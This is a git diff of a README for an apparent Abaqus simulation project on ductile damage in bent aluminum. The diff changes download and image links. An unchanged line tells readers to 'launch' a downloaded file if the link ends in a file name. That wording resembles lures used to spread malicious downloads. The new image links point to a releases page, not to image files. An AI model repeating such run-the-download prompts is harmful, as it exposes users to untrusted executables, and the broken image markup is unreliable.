@@ -8,9 +8,9 @@ Welcome to the repository for "Abaqus-Aluminum-Bending-Ductile-Damage-3D"! Here 
 - **Topics:** abaqus, aluminum-extrusions, cae, ductile, ductile-failure, ductile-fracture, finite-element-analysis, finite-element-methods, quasi-static, simulation
 
 ## 🚀 Quick Access
-You can download the project files [here](https://github.com/releases/789694263/Release.zip) 📦
+You can download the project files [here](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases) 📦
 
-[![Download Project](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/releases/789694263/Release.zip)
+[![Download Project](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)
 
 If the link ends with a file name, make sure to launch it to access the project files. If you encounter any issues with the link, please check the "Releases" section of this repository for alternative download options.
 
@@ -29,10 +29,10 @@ Through the simulations conducted in this project, key findings related to ducti
 ### Visualization of Results
 Here are some visual representations of the simulation results showing the deformation and damage evolution in the aluminum sample:
 
-![Deformation Analysis](https://www.example.com/deformation_analysis.png)
+![Deformation Analysis](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)
 *Figure 1: Deformation Analysis*
 
-![Damage Evolution](https://www.example.com/damage_evolution.png)
+![Damage Evolution](https://github.com/MathisTS9/Abaqus-Aluminum-Bending-Ductile-Damage-3D/releases)
 *Figure 2: Damage Evolution*
 
 ## 🌐 Further Exploration
